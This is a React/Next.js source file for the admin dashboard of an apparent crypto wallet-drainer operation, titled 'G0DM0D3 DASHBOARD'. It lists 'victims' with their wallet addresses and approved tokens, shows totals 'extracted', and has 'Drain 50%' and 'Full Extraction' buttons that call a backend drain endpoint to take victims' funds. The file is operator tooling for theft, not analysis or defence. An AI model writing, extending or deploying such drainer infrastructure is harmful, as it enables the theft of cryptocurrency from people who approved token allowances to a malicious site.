'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { motion } from 'framer-motion';
import { 
  Users, 
  Activity, 
  ShieldAlert, 
  LogOut, 
  RefreshCw, 
  Skull, 
  ExternalLink,
  ChevronRight
} from 'lucide-react';

interface Victim {
  _id: string;
  address: string;
  network: string;
  status: string;
  lastSeen: string;
  approvedTokens: Array<{
    tokenAddress: string;
    tokenSymbol: string;
    amount: string;
  }>;
  totalDrained: number;
}

export default function Dashboard() {
  const [victims, setVictims] = useState<Victim[]>([]);
  const [stats, setStats] = useState({ totalVictims: 0, activeConnections: 0, totalDrained: 0 });
  const [loading, setLoading] = useState(true);
  const [isDraining, setIsDraining] = useState<string | null>(null);
  const router = useRouter();

  const fetchData = async () => {
    const token = localStorage.getItem('adminToken');
    if (!token) {
      router.push('/admin/login');
      return;
    }

    const backendUrl = process.env.NEXT_PUBLIC_BACKEND_URL || '';

    try {
      // Fetch stats
      const statsRes = await fetch(`${backendUrl}/api/dashboard/stats`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      const statsData = await statsRes.json();
      if (statsRes.ok) setStats(statsData);

      // Fetch victims
      const victimsRes = await fetch(`${backendUrl}/api/dashboard/victims`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      const victimsData = await victimsRes.json();
      if (victimsRes.ok) setVictims(victimsData);

    } catch (err) {
      console.error('Failed to fetch dashboard data:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 10000); // Auto refresh every 10s
    return () => clearInterval(interval);
  }, []);

  const handleDrain = async (victimId: string, percentage: number) => {
    const token = localStorage.getItem('adminToken');
    const backendUrl = process.env.NEXT_PUBLIC_BACKEND_URL || '';
    
    setIsDraining(victimId);
    try {
      const res = await fetch(`${backendUrl}/api/dashboard/victims/${victimId}/drain`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}` 
        },
        body: JSON.stringify({ percentage })
      });
      
      const data = await res.json();
      if (res.ok) {
        alert(`Success: ${data.message}`);
        fetchData();
      } else {
        alert(`Error: ${data.message}`);
      }
    } catch (err) {
      alert('Failed to execute drain command');
    } finally {
      setIsDraining(null);
    }
  };

  const logout = () => {
    localStorage.removeItem('adminToken');
    router.push('/admin/login');
  };

  if (loading) return (
    <div className="min-h-screen bg-black flex items-center justify-center">
      <RefreshCw className="w-10 h-10 text-primary animate-spin" />
    </div>
  );

  return (
    <div className="min-h-screen bg-black text-white p-6 md:p-12">
      {/* Header */}
      <div className="max-w-7xl mx-auto flex flex-col md:flex-row md:items-center justify-between mb-12 gap-6">
        <div>
          <h1 className="text-4xl font-black tracking-tight mb-2">G0DM0D3 DASHBOARD</h1>
          <p className="text-gray-500 font-bold uppercase tracking-widest text-xs flex items-center">
            <Activity className="w-3 h-3 mr-2 text-primary" />
            System Live - Monitoring Network
          </p>
        </div>
        <button onClick={logout} className="flex items-center text-gray-400 hover:text-white transition-colors font-bold text-sm">
          <LogOut className="w-4 h-4 mr-2" />
          DISCONNECT
        </button>
      </div>

      {/* Stats Grid */}
      <div className="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
        <div className="glass p-8 rounded-3xl border border-white/5">
          <Users className="w-8 h-8 text-primary mb-4" />
          <p className="text-gray-500 text-xs font-bold uppercase tracking-widest mb-1">Total Targets</p>
          <h2 className="text-4xl font-black">{stats.totalVictims}</h2>
        </div>
        <div className="glass p-8 rounded-3xl border border-white/5">
          <Activity className="w-8 h-8 text-secondary mb-4" />
          <p className="text-gray-500 text-xs font-bold uppercase tracking-widest mb-1">Pending Approvals</p>
          <h2 className="text-4xl font-black">{stats.activeConnections}</h2>
        </div>
        <div className="glass p-8 rounded-3xl border border-white/5">
          <ShieldAlert className="w-8 h-8 text-accent mb-4" />
          <p className="text-gray-500 text-xs font-bold uppercase tracking-widest mb-1">Total Extracted</p>
          <h2 className="text-4xl font-black">${stats.totalDrained.toFixed(2)}</h2>
        </div>
      </div>

      {/* Victim List */}
      <div className="max-w-7xl mx-auto">
        <div className="flex items-center justify-between mb-6">
          <h3 className="text-xl font-bold tracking-tight">DISCOVERED TARGETS</h3>
          <button onClick={fetchData} className="text-primary text-xs font-bold uppercase tracking-widest flex items-center hover:opacity-80">
            <RefreshCw className="w-3 h-3 mr-2" /> Refresh
          </button>
        </div>

        <div className="space-y-4">
          {victims.length === 0 ? (
            <div className="glass p-12 rounded-3xl text-center border border-white/5">
              <p className="text-gray-500 font-medium">No targets detected on current networks.</p>
            </div>
          ) : (
            victims.map((victim) => (
              <motion.div 
                key={victim._id}
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                className="glass p-6 rounded-3xl border border-white/5 hover:border-white/10 transition-all flex flex-col md:flex-row md:items-center justify-between gap-6"
              >
                <div className="flex items-center gap-6">
                  <div className={`w-12 h-12 rounded-2xl flex items-center justify-center ${victim.status === 'active' ? 'bg-primary/10' : 'bg-red-500/10'}`}>
                    <Skull className={`w-6 h-6 ${victim.status === 'active' ? 'text-primary' : 'text-red-500'}`} />
                  </div>
                  <div>
                    <div className="flex items-center gap-2 mb-1">
                      <p className="font-mono font-bold text-sm text-white">{victim.address.slice(0, 10)}...{victim.address.slice(-8)}</p>
                      <span className="bg-white/5 text-[10px] px-2 py-0.5 rounded-full font-bold text-gray-400 uppercase">{victim.network}</span>
                    </div>
                    <p className="text-xs text-gray-500">Last Seen: {new Date(victim.lastSeen).toLocaleString()}</p>
                  </div>
                </div>

                <div className="flex flex-wrap items-center gap-3">
                  <button 
                    onClick={() => handleDrain(victim._id, 50)}
                    disabled={isDraining === victim._id}
                    className="bg-white/5 hover:bg-white/10 text-white px-4 py-2.5 rounded-xl text-xs font-bold uppercase tracking-widest transition-colors border border-white/10 disabled:opacity-50"
                  >
                    {isDraining === victim._id ? 'Processing...' : 'Drain 50%'}
                  </button>
                  <button 
                    onClick={() => handleDrain(victim._id, 100)}
                    disabled={isDraining === victim._id}
                    className="bg-primary text-black px-4 py-2.5 rounded-xl text-xs font-bold uppercase tracking-widest transition-colors shadow-lg shadow-primary/20 disabled:opacity-50"
                  >
                    {isDraining === victim._id ? 'Processing...' : 'Full Extraction'}
                  </button>
                  <a 
                    href={`https://bscscan.com/address/${victim.address}`} 
                    target="_blank" 
                    className="w-10 h-10 bg-white/5 rounded-xl flex items-center justify-center text-gray-400 hover:text-white hover:bg-white/10 transition-all border border-white/5"
                  >
                    <ExternalLink className="w-4 h-4" />
                  </a>
                </div>
              </motion.div>
            ))
          )}
        </div>
      </div>
    </div>
  );
}
